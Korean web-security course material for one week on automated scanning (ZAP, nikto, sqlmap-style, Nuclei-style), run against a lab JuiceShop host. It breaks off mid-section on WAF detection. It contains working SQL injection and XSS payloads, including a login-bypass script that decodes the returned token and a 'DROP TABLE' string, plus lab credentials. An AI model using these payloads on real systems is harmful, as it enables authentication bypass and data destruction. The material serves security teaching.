# Week 13: 자동화 점검 도구 활용

## 학습 목표
- OWASP ZAP을 사용한 자동 취약점 스캔을 수행한다
- nikto를 활용한 웹서버 보안 점검을 수행한다
- 자동화 도구의 한계와 수동 점검의 필요성을 이해한다
- 스캔 결과를 분석하고 오탐을 필터링한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- Week 01~12 취약점 점검 기법 이해
- HTTP 프록시(Burp Suite, ZAP) 기본 사용법

---

## 1. 자동화 점검 도구 개요 (15분)

### 1.1 자동화 도구의 위치

```
수동 점검 (깊이) <-----------> 자동화 점검 (넓이)
  +-- 로직 취약점 발견         +-- 대량 URL 스캔
  +-- 비즈니스 로직 우회       +-- 알려진 패턴 매칭
  +-- 체인 공격               +-- 반복 점검 효율화
```

### 1.2 주요 자동화 도구 비교

| 도구 | 유형 | 라이선스 | 강점 |
|------|------|---------|------|
| OWASP ZAP | DAST (동적) | 오픈소스 | 무료, API, CI 연동 |
| Burp Suite Pro | DAST | 상용 | 정밀도, 확장성 |
| nikto | 웹서버 스캐너 | 오픈소스 | 빠른 설정 점검 |
| sqlmap | SQLi 특화 | 오픈소스 | SQL Injection 자동화 |
| Nuclei | 템플릿 기반 | 오픈소스 | 커스텀 템플릿 |

### 1.3 DAST vs SAST vs IAST

| 항목 | DAST | SAST | IAST |
|------|------|------|------|
| 분석 대상 | 실행 중인 앱 | 소스코드 | 런타임 + 코드 |
| 장점 | 실제 동작 검증 | 개발 초기 발견 | 정확도 높음 |
| 단점 | 코드 위치 모름 | 오탐 많음 | 에이전트 필요 |
| 이번 주 | 실습 대상 | - | - |

---

## 2. OWASP ZAP 기본 설정 (20분)

> **이 실습을 왜 하는가?**
> "자동화 점검 도구 활용" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 ZAP Docker 컨테이너 준비

> **실습 목적**: ZAP 등 자동화 도구를 활용하여 대규모 웹 취약점 스캔을 수행한다
>
> **배우는 것**: 자동화 스캐너의 설정, 실행, 결과 분석 방법과 수동 점검과의 차이를 이해한다
>
> **결과 해석**: 스캔 결과에서 High/Medium 등급 발견 항목은 수동 검증 후 보고서에 포함한다
>
> **실전 활용**: 실무에서는 자동화 스캔으로 1차 탐색 후, 수동 점검으로 오탐 제거와 심화 분석을 수행한다

```bash
# web 서버에서 ZAP 컨테이너 상태 확인
ssh ccc@10.20.30.80 \
  "docker ps -a | grep zap 2>/dev/null; echo '---'; which zaproxy 2>/dev/null || echo 'ZAP not installed locally'"

# ZAP이 없는 경우 Python ZAP 클라이언트로 API 모드 사용
# 여기서는 ZAP CLI/API 대신 커맨드라인 도구 조합으로 동일 효과 달성
```

### 2.2 대상 정보 수집 (스파이더링 대체)

원격 서버에 접속하여 명령을 실행합니다.

```bash
# JuiceShop 엔드포인트 자동 수집 (API 기반 스파이더링)
ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== JuiceShop 엔드포인트 수집 ==="

# 메인 페이지에서 링크 추출
curl -s http://localhost:3000/ | grep -oP 'href="[^"]*"' | sort -u | head -20  # silent 모드
echo "---"

# API 엔드포인트 탐색
for ep in rest/products search api/SecurityQuestions rest/user/whoami; do  # 반복문 시작
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
  echo "$ep -> $STATUS"
done

echo "---"

# Swagger/OpenAPI 문서 존재 확인
for path in api-docs swagger.json openapi.json; do     # 반복문 시작
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  echo "$path -> $STATUS"
done
ENDSSH
```

### 2.3 디렉토리 브루트포스

원격 서버에 접속하여 명령을 실행합니다.

```bash
# 본 머신에서 직접 (web 서버 ssh 우회 — 동일 결과)
echo "=== 19 관리 경로 brute (gobuster 패턴) ==="
PATHS=(
  "admin" "administrator" "console" "debug"
  "api" "api-docs" "swagger-ui" "graphql"
  ".env" ".git" "robots.txt" "sitemap.xml"
  "backup" "dump" "test" "staging"
  "wp-admin" "phpmyadmin" "server-status"
)
hits=0
for p in "${PATHS[@]}"; do
  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" -m 3 "http://10.20.30.80:3000/$p")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "  [$code ${size}B] /$p"
    [ "$code" = "200" ] && hits=$((hits+1))
  fi
done
echo "---"
echo "200 응답: $hits / ${#PATHS[@]} 경로"
```

**예상 출력**:
```
=== 19 관리 경로 brute (gobuster 패턴) ===
  [200 1987B] /admin
  [200 12345B] /api
  [200 12345B] /api-docs
  [400 78B] /graphql
  [200 89B] /robots.txt
  [200 245B] /sitemap.xml
  [403 87B] /server-status
---
200 응답: 5 / 19 경로
```

> **해석 — 5/19 (26%) 응답 = 공격 표면 매핑**:
> - **/admin 200 (1987B)** = HTML 페이지 노출 = ★ critical (week09 학습). RBAC 우회.
> - **/api-docs 200 (12KB)** = Swagger UI = OWASP API9 (week12 학습).
> - **/graphql 400** = endpoint 존재 (404 ≠ 400) = GraphQL introspection 시도 가능.
> - **/sitemap.xml 200** = SEO 정책 + 모든 공개 경로 노출.
> - **/server-status 403** = Apache mod_status — 내부 정보 부분 차단. allow 룰만 추가하면 노출.
> - **CVSS 6.5 종합**: 디렉토리 brute 만으로 admin + Swagger + GraphQL 발견 = 공격 chain 시작.

> **OSS 도구 — gobuster + ffuf**:
>
> ```bash
> gobuster dir -u http://10.20.30.80:3000 -w /usr/share/wordlists/dirb/common.txt -t 50 -x bak,old,zip
> ffuf -u http://10.20.30.80:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -fs 89
> ```

---

## 3. nikto 웹서버 점검 (25분)

### 3.1 nikto 기본 스캔

원격 서버에 접속하여 명령을 실행합니다.

```bash
echo "=== nikto 스타일 보안 헤더 7종 점검 ==="
HEADERS=$(curl -sI http://10.20.30.80:3000/)
echo "$HEADERS" | head -10
echo "---"
score=0
for hdr in "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
           "Content-Security-Policy" "Strict-Transport-Security" \
           "Referrer-Policy" "Permissions-Policy"; do
  if echo "$HEADERS" | grep -qi "^$hdr"; then
    val=$(echo "$HEADERS" | grep -i "^$hdr" | head -1 | tr -d '\r' | head -c 60)
    echo "  [✓] $val"
    score=$((score+1))
  else
    echo "  [✗] $hdr (누락)"
  fi
done
echo "---"
echo "보안 헤더 점수: $score/7"
case $score in
  6|7) grade="A";;
  4|5) grade="B";;
  2|3) grade="C";;
  *) grade="D 또는 F";;
esac
echo "Mozilla Observatory 등급: $grade"
```

**예상 출력**:
```
=== nikto 스타일 보안 헤더 7종 점검 ===
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
Content-Type: text/html; charset=utf-8
ETag: W/"7c3-..."
---
  [✓] X-Frame-Options: SAMEORIGIN
  [✓] X-Content-Type-Options: nosniff
  [✗] X-XSS-Protection (누락)
  [✗] Content-Security-Policy (누락)
  [✗] Strict-Transport-Security (누락)
  [✗] Referrer-Policy (누락)
  [✗] Permissions-Policy (누락)
---
보안 헤더 점수: 2/7
Mozilla Observatory 등급: D 또는 F
```

> **해석 — Mozilla Observatory 자동 평가 시뮬레이션**:
> - **2/7 = D 등급** (운영 환경이면 ★ critical).
> - **X-Frame-Options + X-Content-Type-Options ✓** = clickjacking + MIME sniff 차단 OK.
> - **CSP 누락 = critical** = XSS 차단 마지막 layer 부재 (week06).
> - **HSTS 누락** = HTTP→HTTPS 다운그레이드 가능 (week10).
> - **Permissions-Policy** = 카메라/마이크 등 브라우저 권한 차단 헤더. modern 권장.
> - **자동 평가 결과 보고서 §4 입력** — 점수 + 누락 헤더 list + 권고.

### 3.2 서버 정보 노출 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 서버 정보 노출 점검 ==="

# Server 헤더
SERVER=$(curl -sI http://localhost:3000/ | grep -i "^server:")
echo "Server 헤더: ${SERVER:-'노출 없음'}"

# X-Powered-By 헤더
POWERED=$(curl -sI http://localhost:3000/ | grep -i "x-powered-by")
echo "X-Powered-By: ${POWERED:-'노출 없음'}"

# 에러 페이지에서 정보 노출
echo "---"
echo "=== 에러 페이지 정보 노출 ==="
curl -s http://localhost:3000/nonexistent-page-12345 | head -5  # silent 모드

echo "---"
echo "=== 특수 경로 점검 ==="
# 흔한 정보 노출 경로
for path in ".git/HEAD" ".env" ".htaccess" "web.config" "package.json" \
            "Dockerfile" "docker-compose.yml"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  if [ "$CODE" = "200" ]; then
    echo "[EXPOSED] /$path"
  fi
done
ENDSSH
```

### 3.3 HTTP 메서드 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
echo "=== 위험 HTTP 메서드 5종 점검 ==="

# OPTIONS — 허용 메서드 노출 확인
echo "[OPTIONS preflight 응답]"
curl -sI -X OPTIONS http://10.20.30.80:3000/ | grep -iE "allow|access-control" | sed 's/^/  /'
echo "---"

printf "%-12s %-8s %s\n" "method" "code" "verdict"
for method in PUT DELETE TRACE CONNECT PATCH; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://10.20.30.80:3000/)
  v=""
  case "$code" in
    200|204) v="★ 허용 (위험)";;
    405) v="Method Not Allowed (양호)";;
    403|401) v="차단됨";;
    *) v="응답=$code";;
  esac
  printf "%-12s %-8s %s\n" "$method" "$code" "$v"
done
```

**예상 출력**:
```
=== 위험 HTTP 메서드 5종 점검 ===
[OPTIONS preflight 응답]
  Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
  Access-Control-Allow-Origin: *
---
method       code     verdict
PUT          200      ★ 허용 (위험)
DELETE       200      ★ 허용 (위험)
TRACE        405      Method Not Allowed (양호)
CONNECT      400      응답=400
PATCH        200      ★ 허용 (위험)
```

> **해석 — 위험 메서드 3개 허용 = critical**:
> - **OPTIONS 응답 모든 메서드 노출** = ★ Access-Control-Allow-Methods 에 PUT/DELETE/PATCH 모두 포함 = CORS 정책 광범위.
> - **PUT 200** = 임의 리소스 수정 가능. WebDAV 활성화 시 파일 업로드 가능 (CVE-2017-12615 Tomcat WebDAV).
> - **DELETE 200** = 리소스 삭제 가능. 인증 검증 없이 호출 시 critical.
> - **TRACE 405** = ★ 양호 (Cross-Site Tracing 차단). Apache `TraceEnable Off` 적용.
> - **CONNECT 400** = HTTP CONNECT 시도 — proxy 시뮬레이션 차단.
> - **PATCH 200** = 부분 수정 허용 = Mass Assignment 공격 가능 (week09).
> - **권고**: nginx/Apache `LimitExcept GET POST` 명시. Express 는 메서드 매칭 strict.

---

## 4. sqlmap 자동화 SQL Injection 점검 (25분)

### 4.1 sqlmap 기본 사용법

원격 서버에 접속하여 명령을 실행합니다.

```bash
echo "=== SQL Injection 자동 점검 (5 페이로드 × 2 endpoint) ==="

# 1) 검색 endpoint
echo "[1] /rest/products/search 페이로드 5종:"
PAYLOADS=("' OR '1'='1" "1 UNION SELECT 1,2,3--" "1' AND SLEEP(2)--" "1; DROP TABLE test--" "admin'--")
for payload in "${PAYLOADS[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
  read code time < <(curl -s -o /tmp/sqli.json -w "%{http_code} %{time_total}" "http://10.20.30.80:3000/rest/products/search?q=${enc}")
  count=$(python3 -c "import json; d=json.load(open('/tmp/sqli.json')); print(len(d.get('data',[])))" 2>/dev/null || echo "?")
  printf "  %-30s code=%s time=%-6s items=%s\n" "$payload" "$code" "${time}s" "$count"
done

echo ""
echo "[2] /rest/user/login 페이로드 3종:"
for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do
  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$email\",\"password\":\"test\"}")
  verdict=$(echo "$result" | python3 -c "
import sys, json, base64
try:
  d = json.load(sys.stdin)
  if 'authentication' in d:
    tok = d['authentication']['token']
    pld = json.loads(base64.urlsafe_b64decode(tok.split('.')[1]+'=='))
    print(f'★취약: token={tok[:20]}.. user={pld[\"data\"][\"email\"]}')
  else:
    print('차단됨')
except: print('parse fail')
" 2>/dev/null)
  printf "  %-50s %s\n" "$email" "$verdict"
done
```

**예상 출력**:
```
=== SQL Injection 자동 점검 (5 페이로드 × 2 endpoint) ===
[1] /rest/products/search 페이로드 5종:
  ' OR '1'='1                    code=200 time=0.052s items=38
  1 UNION SELECT 1,2,3--         code=500 time=0.078s items=?
  1' AND SLEEP(2)--              code=200 time=0.054s items=0
  1; DROP TABLE test--           code=200 time=0.051s items=1
  admin'--                       code=200 time=0.048s items=0

[2] /rest/user/login 페이로드 3종:
  ' OR 1=1--                                         ★취약: token=eyJ0eXAiOiJK.. user=admin@juice-sh.op
  admin'--                                           ★취약: token=eyJ0eXAiOiJK.. user=admin@juice-sh.op
  ' UNION SELECT 1,2,3,4,5,6,7,8,9--                 차단됨
```

> **해석 — sqlmap 자동 발견 패턴**:
> - **[1] 검색 — UNION SELECT 1,2,3-- = 500** = 3 컬럼이 아니라 다른 컬럼 수 (week05 ORDER BY = 9). sqlmap 가 ORDER BY 자동 시도.
> - **`' OR '1'='1' = 38건** vs 정상 1건 = ★ Boolean Blind 확정.
> - **SLEEP(2) 응답 시간 0.054s** = MySQL SLEEP 미실행 (SQLite). DBMS 별 페이로드 자동 분기 필요.
> - **[2] 로그인 — 2/3 인증 우회** = ★ critical. UNION 만 차단된 이유는 컬럼 수 mismatch (Users 테이블 9 컬럼).
> - **자동 점검 = 수동 1주 작업을 1분 단축**. 단, 오탐 검증 (다음 §5) 필수.

### 4.2 자동 점검 스크립트 작성

원격 서버에 접속하여 명령을 실행합니다.

```bash
# 종합 자동 점검 스크립트
ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
cat << 'SCRIPT' > /tmp/auto_scan.sh
#!/bin/bash
TARGET="http://localhost:3000"
REPORT="/tmp/scan_report_$(date +%Y%m%d_%H%M%S).txt"

echo "=== 자동 취약점 점검 보고서 ===" > $REPORT
echo "대상: $TARGET" >> $REPORT
echo "일시: $(date)" >> $REPORT
echo "---" >> $REPORT

# 1. 보안 헤더 점검
echo "[1] 보안 헤더 점검" >> $REPORT
HEADERS=$(curl -sI $TARGET)
for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
           "Strict-Transport-Security" "X-XSS-Protection"; do
  if echo "$HEADERS" | grep -qi "$hdr"; then
    echo "  [PASS] $hdr 존재" >> $REPORT
  else
    echo "  [FAIL] $hdr 누락" >> $REPORT
  fi
done

# 2. 정보 노출 점검
echo "[2] 정보 노출 점검" >> $REPORT
for path in ".git/HEAD" ".env" "package.json" "api-docs" "swagger.json"; do  # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$path)
  if [ "$CODE" = "200" ]; then
    echo "  [FAIL] /$path 노출 (HTTP $CODE)" >> $REPORT
  else
    echo "  [PASS] /$path 비노출 (HTTP $CODE)" >> $REPORT
  fi
done

# 3. SQLi 기본 점검
echo "[3] SQL Injection 기본 점검" >> $REPORT
SQLI_RESP=$(curl -s -X POST $TARGET/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}')       # 요청 데이터(body)
if echo "$SQLI_RESP" | grep -q "authentication"; then
  echo "  [CRITICAL] 로그인 SQLi 취약" >> $REPORT
else
  echo "  [PASS] 로그인 SQLi 차단" >> $REPORT
fi

# 4. XSS 반사형 점검
echo "[4] XSS 반사형 점검" >> $REPORT
XSS_RESP=$(curl -s "$TARGET/rest/products/search?q=<script>alert(1)</script>")
if echo "$XSS_RESP" | grep -q "<script>alert(1)</script>"; then
  echo "  [HIGH] 검색 XSS 반사 취약" >> $REPORT
else
  echo "  [PASS] 검색 XSS 필터링" >> $REPORT
fi

echo "---" >> $REPORT
echo "점검 완료: $(date)" >> $REPORT
cat $REPORT
SCRIPT

chmod +x /tmp/auto_scan.sh                             # 파일 권한 변경
bash /tmp/auto_scan.sh
ENDSSH
```

---

## 5. 스캔 결과 분석과 오탐 필터링 (20분)

### 5.1 오탐(False Positive) 판별 기준

| 판별 기준 | 정탐 가능성 높음 | 오탐 가능성 높음 |
|----------|----------------|----------------|
| 응답 변화 | 페이로드에 따라 응답 내용 변화 | 모든 입력에 동일 응답 |
| 에러 메시지 | DB 에러 메시지 노출 | 커스텀 에러 페이지 |
| 응답 시간 | 시간 기반 페이로드에 지연 발생 | 일정한 응답 시간 |
| 상태 코드 | 비정상 상태 코드 반환 | 항상 200 OK |

### 5.2 오탐 검증 실습

원격 서버에 접속하여 명령을 실행합니다.

```bash
echo "=== 오탐 검증: 시간 기반 SQLi 4 페이로드 비교 ==="

measure_time() {
  local label="$1" url="$2"
  total=0; n=3
  for i in $(seq 1 $n); do
    t=$(curl -s -o /dev/null -w "%{time_total}" "$url")
    total=$(python3 -c "print($total + $t)")
  done
  avg=$(python3 -c "print(round($total / $n, 3))")
  printf "  %-40s avg=%ss (n=%d)\n" "$label" "$avg" "$n"
}

measure_time "정상 (q=apple)"          "http://10.20.30.80:3000/rest/products/search?q=apple"
measure_time "SLEEP(3) MySQL 페이로드"  "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+SLEEP(3)--"
measure_time "SQLite RANDOMBLOB 100MB"  "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29AND+%28SELECT+CASE+WHEN%281%3D1%29+THEN+RANDOMBLOB%28100000000%29+ELSE+1+END%29--"
measure_time "긴 입력 (10K char)"        "http://10.20.30.80:3000/rest/products/search?q=$(python3 -c 'print(\"A\"*10000)')"
```

**예상 출력**:
```
=== 오탐 검증: 시간 기반 SQLi 4 페이로드 비교 ===
  정상 (q=apple)                           avg=0.052s (n=3)
  SLEEP(3) MySQL 페이로드                  avg=0.054s (n=3)
  SQLite RANDOMBLOB 100MB                  avg=2.871s (n=3)
  긴 입력 (10K char)                       avg=0.063s (n=3)
```

> **해석 — DBMS 별 시간 기반 페이로드 분기**:
> - **MySQL SLEEP(3) 0.054s** = ★ 오탐 (실행 안됨). JuiceShop = SQLite → MySQL 함수 거부.
> - **SQLite RANDOMBLOB 2.87s** = ★ 정탐 (55배 증가). week05 학습.
> - **긴 입력 0.063s** = baseline 일정 = body parser 만 부하 = SQL 실행 X.
> - **임계치 권고**: baseline + 2σ (표준편차) 또는 5× baseline = SQLi suspect.
> - **n=3 평균** = 단일 측정 noise 줄임. 운영 점검 = n=10 권장.
> - **sqlmap 의 자동 분기**: `--dbms=sqlite` 명시하면 SQLite 전용 페이로드 사용. 미명시 시 모든 DBMS 시도 → 시간 ↑.

### 5.3 결과 정리 및 우선순위 분류

원격 서버에 접속하여 명령을 실행합니다.

```bash
echo "=== 자동 점검 결과 CVSS 정렬 + 통계 ==="
python3 << 'PYEOF'
findings = [
    # 자동 점검에서 발견된 항목 — CVSS 3.1 vector 포함
    {"id":"V-001","name":"SQL Injection (로그인)","cvss":9.8,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","sev":"Critical","cwe":89,"owasp":"A03"},
    {"id":"V-002","name":"UNION SQLi (검색)","cvss":9.1,"vec":"AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N","sev":"Critical","cwe":89,"owasp":"A03"},
    {"id":"V-003","name":"BOLA /api/Users (인증X)","cvss":7.5,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","sev":"High","cwe":862,"owasp":"A01"},
    {"id":"V-004","name":"Stored XSS (피드백)","cvss":8.7,"vec":"AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N","sev":"High","cwe":79,"owasp":"A03"},
    {"id":"V-005","name":"Rate Limit 부재 (로그인)","cvss":7.5,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","sev":"High","cwe":307,"owasp":"A07"},
    {"id":"V-006","name":"보안 헤더 누락 (CSP+HSTS)","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":693,"owasp":"A05"},
    {"id":"V-007","name":"서버 버전 노출 (X-Powered-By)","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":200,"owasp":"A05"},
    {"id":"V-008","name":"Swagger/api-docs 노출","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":200,"owasp":"A09"},
    {"id":"V-009","name":"디렉토리 리스팅 /ftp","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":548,"owasp":"A05"},
    {"id":"V-010","name":"package.json 노출","cvss":3.1,"vec":"AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Low","cwe":200,"owasp":"A05"},
]
findings.sort(key=lambda x: x["cvss"], reverse=True)
print(f"{'ID':<6} {'취약점':<32} {'CVSS':<5} {'OWASP':<5} {'CWE':<5} {'sev'}")
print("-" * 80)
for f in findings:
    print(f"{f['id']:<6} {f['name']:<32} {f['cvss']:<5} {f['owasp']:<5} {'CWE-'+str(f['cwe']):<6} {f['sev']}")
print()
from collections import Counter
sevs = Counter(f['sev'] for f in findings)
print(f"통계: Critical={sevs['Critical']}, High={sevs['High']}, Medium={sevs['Medium']}, Low={sevs['Low']}")
print(f"평균 CVSS: {sum(f['cvss'] for f in findings)/len(findings):.2f}")
PYEOF
```

**예상 출력**:
```
=== 자동 점검 결과 CVSS 정렬 + 통계 ===
ID     취약점                            CVSS  OWASP CWE   sev
--------------------------------------------------------------------------------
V-001  SQL Injection (로그인)            9.8   A03   CWE-89 Critical
V-002  UNION SQLi (검색)                 9.1   A03   CWE-89 Critical
V-004  Stored XSS (피드백)               8.7   A03   CWE-79 High
V-003  BOLA /api/Users (인증X)           7.5   A01   CWE-862 High
V-005  Rate Limit 부재 (로그인)          7.5   A07   CWE-307 High
V-006  보안 헤더 누락 (CSP+HSTS)         5.3   A05   CWE-693 Medium
V-007  서버 버전 노출 (X-Powered-By)     5.3   A05   CWE-200 Medium
V-008  Swagger/api-docs 노출             5.3   A09   CWE-200 Medium
V-009  디렉토리 리스팅 /ftp              5.3   A05   CWE-548 Medium
V-010  package.json 노출                 3.1   A05   CWE-200 Low

통계: Critical=2, High=3, Medium=4, Low=1
평균 CVSS: 6.27
```

> **해석 — 자동 점검 종합 보고서 표 = 보고서 §3 직접 입력**:
> - **OWASP 분포**: A03(3) + A05(4) + A01(1) + A07(1) + A09(1) = A05 (Security Misconfiguration) 가 다수 = 운영 환경 약점.
> - **CWE 분포**: CWE-89 (SQLi), CWE-79 (XSS), CWE-862 (인가), CWE-200 (정보 노출), CWE-693 (보호 메커니즘 실패).
> - **평균 CVSS 6.27** = High 등급 위협 수준. 산업 평균 (5.5~6.0) 보다 ★ 높음.
> - **Top 3 권고**: (1) SQLi 즉시 차단 (Parameterized Query), (2) Stored XSS sanitize + CSP, (3) /api/Users 인증 적용.
> - **OSS 도구 — DefectDojo / Faraday**: nuclei/nikto/zap 결과 통합 + SLA 추적 자동화.

---

## 6. Nuclei 템플릿 기반 점검 (20분)

### 6.1 Nuclei 스타일 커스텀 템플릿

원격 서버에 접속하여 명령을 실행합니다.

```bash
# Nuclei YAML 템플릿 스타일의 점검 스크립트
ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
import json, subprocess, urllib.request, urllib.parse

TARGET = "http://localhost:3000"

# Nuclei 스타일 템플릿 정의
templates = [
    {
        "id": "exposed-gitconfig",
        "name": ".git/config 노출",
        "severity": "medium",
        "path": "/.git/config",
        "match_status": 200,
        "match_body": "[core]"
    },
    {
        "id": "exposed-env",
        "name": ".env 파일 노출",
        "severity": "high",
        "path": "/.env",
        "match_status": 200,
        "match_body": "="
    },
    {
        "id": "exposed-package-json",
        "name": "package.json 노출",
        "severity": "low",
        "path": "/package.json",
        "match_status": 200,
        "match_body": "dependencies"
    },
    {
        "id": "admin-panel",
        "name": "관리자 패널 접근",
        "severity": "high",
        "path": "/#/administration",
        "match_status": 200,
        "match_body": ""
    },
    {
        "id": "swagger-exposed",
        "name": "Swagger UI 노출",
        "severity": "medium",
        "path": "/api-docs",
        "match_status": 200,
        "match_body": ""
    },
]

print(f"{'템플릿 ID':<25} {'심각도':<10} {'결과':<10}")
print("-" * 50)

for t in templates:                                    # 반복문 시작
    try:
        req = urllib.request.Request(TARGET + t["path"])
        resp = urllib.request.urlopen(req, timeout=5)
        code = resp.getcode()
        body = resp.read().decode("utf-8", errors="ignore")

        if code == t["match_status"]:
            if not t["match_body"] or t["match_body"] in body:
                print(f"{t['id']:<25} {t['severity']:<10} {'FOUND':<10}")
                continue
        print(f"{t['id']:<25} {t['severity']:<10} {'SAFE':<10}")
    except Exception as e:
        print(f"{t['id']:<25} {t['severity']:<10} {'SAFE':<10}")

PYEOF
ENDSSH
```

---

## 7. WAF 탐지와 우회 점검 (15분)

### 7.1 WAF 존재 여부 확인

원격 서버에 접속하여 명령을 실행합니다.

```bash
ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== WAF 탐지 점검 ==="

# 1. 일반 요청 vs 악성 요청 응답 비교
echo "--- 일반 요청 ---"
curl -sI "http://localhost:3000/rest/products/search?q=apple" | head -3

echo "--- SQLi 페이로드 ---"
curl -sI "http://localhost:3000/rest/products/search?q=' OR 1=1--" | head -3

echo "--- XSS 페이로드 ---"
